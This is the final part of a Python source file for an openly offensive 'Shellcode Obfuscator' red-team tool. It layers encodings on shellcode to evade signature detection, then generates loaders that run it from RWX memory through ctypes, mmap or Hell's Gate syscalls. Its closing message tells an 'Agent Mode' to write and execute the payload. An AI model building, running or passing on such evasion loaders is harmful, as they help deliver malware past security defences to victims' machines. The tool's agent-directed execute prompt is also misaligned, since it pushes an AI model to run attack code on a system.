            lines.append('import ctypes')
            lines.append('')
            lines.append('# Create RWX memory mapping')
            lines.append('mm = mmap.mmap(-1, len(buf),')
            lines.append('              prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,')
            lines.append('              flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS)')
            lines.append('mm.write(buf)')
            lines.append('')
            lines.append('# Cast and execute')
            lines.append('fptr = ctypes.CFUNCTYPE(ctypes.c_void_p)(')
            lines.append('    ctypes.addressof(ctypes.c_char.from_buffer(mm))')
            lines.append(')')
            lines.append('fptr()')

        payload = '\n'.join(lines)

        if output_file:
            os.makedirs(os.path.dirname(output_file) or '.', exist_ok=True)
            with open(output_file, 'w') as f:
                f.write(payload)
            print(f"[+] Payload written to: {output_file}")

        return payload


# ═════════════════════════════════════════════════════════════════════════════
#  CLI
# ═════════════════════════════════════════════════════════════════════════════

def parse_shellcode_input(data: str) -> bytes:
    """Parse various shellcode input formats into raw bytes."""
    data = data.strip()

    # \\xfc\\xe8 format
    if '\\x' in data:
        hex_str = data.replace('\\x', '')
        return bytes.fromhex(hex_str)

    # 0xfc, 0xe8 format
    if '0x' in data:
        parts = data.replace(',', ' ').split()
        hex_bytes = []
        for p in parts:
            p = p.strip()
            if p.startswith('0x') or p.startswith('0X'):
                hex_bytes.append(int(p, 16))
        return bytes(hex_bytes)

    # Raw hex string
    try:
        return bytes.fromhex(data)
    except ValueError:
        pass

    # Assume raw data (binary file content)
    return data.encode('latin-1')


def banner():
    print(r"""
  ┌─────────────────────────────────────────────┐
  │  ███████╗██╗  ██╗ ██████╗ ██████╗ ███████╗ │
  │  ██╔════╝██║  ██║██╔═══██╗██╔══██╗██╔════╝ │
  │  ███████╗███████║██║   ██║██████╔╝█████╗   │
  │  ╚════██║██╔══██║██║   ██║██╔══██╗██╔══╝   │
  │  ███████║██║  ██║╚██████╔╝██║  ██║███████╗ │
  │  ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ │
  │      Shellcode Obfuscator v3.0               │
  │      Red Team Utility — Authorized Use       │
  └─────────────────────────────────────────────┘
    """)


def check_dependencies(techniques: List[str]) -> bool:
    """Check that required libraries are available for selected techniques."""
    need_crypto = {'bcrypt_aes'}
    need_bcrypt = {'bcrypt_aes'}
    need_net = {'uuid', 'ipv6'}

    selected = set(techniques)

    if selected & need_crypto and not CRYPTO_AVAILABLE:
        print("[-] 'cryptography' library required for bcrypt_aes technique.")
        print("    Install: pip install cryptography")
        return False

    if selected & need_bcrypt and not BCRYPT_AVAILABLE:
        print("[-] 'bcrypt' library required for bcrypt_aes technique.")
        print("    Install: pip install bcrypt")
        return False

    return True


def main():
    parser = argparse.ArgumentParser(
        description='Shellcode Obfuscator v3.0 — Evade signature detection',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 obfuscator.py -s "\\xfc\\xe8\\x82\\x00\\x00\\x00" -t xor
  python3 obfuscator.py -f beacon.bin -t rc4,bcrypt_aes,printable -o payload.py
  python3 obfuscator.py -f shellcode.bin -t all -m syscall -o bypass_payload.py
  python3 obfuscator.py -s "\\xfc\\xe8" -t rc4 -m ctypes --passphrase "MyRedTeamKey"

Available techniques:
  xor, xor_multi, rot, sub, not, aes_like, insertion, base64,
  uuid, ipv6, rc4, bcrypt_aes, printable, syscall_obf, all
        """
    )

    parser.add_argument('-s', '--shellcode', help='Shellcode string (e.g., \\\\xfc\\\\xe8\\\\x82...)')
    parser.add_argument('-f', '--file', help='Binary file containing raw shellcode')
    parser.add_argument('-t', '--techniques', nargs='+', default=['xor'],
                        help='Obfuscation techniques (comma or space separated)')
    parser.add_argument('-o', '--output', help='Output payload file (.py)')
    parser.add_argument('-m', '--method', choices=['ctypes', 'mmap', 'syscall'],
                        default='ctypes',
                        help='Execution method (default: ctypes; syscall = Hell\'s Gate)')
    parser.add_argument('--passphrase', help='Passphrase for bcrypt_aes encryption')
    parser.add_argument('--list', action='store_true', help='List available techniques')
    parser.add_argument('--no-banner', action='store_true', help='Suppress banner')

    args = parser.parse_args()

    if args.list:
        print("\nAvailable techniques:")
        for name, (_, _, desc) in ShellcodeObfuscator.TECHNIQUES.items():
            print(f"  {name:15s} - {desc}")
        print(f"\nExecution methods: ctypes (Win32), mmap (Linux), syscall (Hell's Gate x64)")
        print()
        return

    if not args.no_banner:
        banner()

    # Load shellcode
    if args.shellcode:
        sc = parse_shellcode_input(args.shellcode)
    elif args.file:
        with open(args.file, 'rb') as f:
            sc = f.read()
    else:
        print("[-] Provide shellcode via -s or -f")
        sys.exit(1)

    print(f"[+] Loaded shellcode: {len(sc)} bytes")
    print(f"[+] First 16 bytes: {sc[:16].hex()}")

    # Parse techniques list
    techs = []
    for t in args.techniques:
        for subt in t.split(','):
            subt = subt.strip()
            if subt == 'all':
                techs = list(ShellcodeObfuscator.TECHNIQUES.keys())
                break
            elif subt in ShellcodeObfuscator.TECHNIQUES:
                techs.append(subt)
            else:
                print(f"[-] Unknown technique: {subt}")
                print(f"    Use --list to see available techniques")
                sys.exit(1)
        if techs == list(ShellcodeObfuscator.TECHNIQUES.keys()):
            break

    if not techs:
        techs = ['xor']

    # Check dependencies
    if not check_dependencies(techs):
        sys.exit(1)

    print(f"[+] Techniques: {', '.join(techs)}")
    print(f"[+] Execution method: {args.method}")

    # Obfuscate
    obf = ShellcodeObfuscator(sc)

    kwargs = {}
    if 'bcrypt_aes' in techs and args.passphrase:
        kwargs['passphrase'] = args.passphrase

    if len(techs) == 1:
        meta = obf.apply(techs[0], **kwargs)
        print(f"[+] Encoded size: {meta['size']} bytes")
        _print_key_info(meta)
    else:
        metas = obf.apply_chain(techs, **kwargs)
        print(f"[+] Chain complete — {len(metas)} layers applied")
        for i, m in enumerate(metas):
            print(f"    Layer {i+1}: {m['technique']} ({m['size']} bytes)")
            _print_key_info(m)

    # Generate payload
    payload = obf.generate_payload_python(
        techs,
        output_file=args.output,
        execution_method=args.method,
        passphrase=args.passphrase,
    )

    if not args.output:
        print("\n" + "=" * 60)
        print("GENERATED PAYLOAD:")
        print("=" * 60)
        print(payload)

    print(f"\n[+] Done. Use Agent Mode to write and execute this payload.")


def _print_key_info(meta: dict):
    """Helper to print key material for a technique result."""
    if 'key' in meta:
        key = meta['key']
        if isinstance(key, int):
            print(f"    XOR key: 0x{key:02x}")
        elif isinstance(key, bytes):
            print(f"    Key: {key.hex()}")
    if 'passphrase' in meta:
        # Truncate for display
        pp = meta['passphrase']
        shown = pp[:8] + '...' if len(pp) > 8 else pp
        print(f"    Passphrase: {shown}")
    if 'shift' in meta:
        print(f"    Shift: {meta['shift']}")


if __name__ == '__main__':
    main()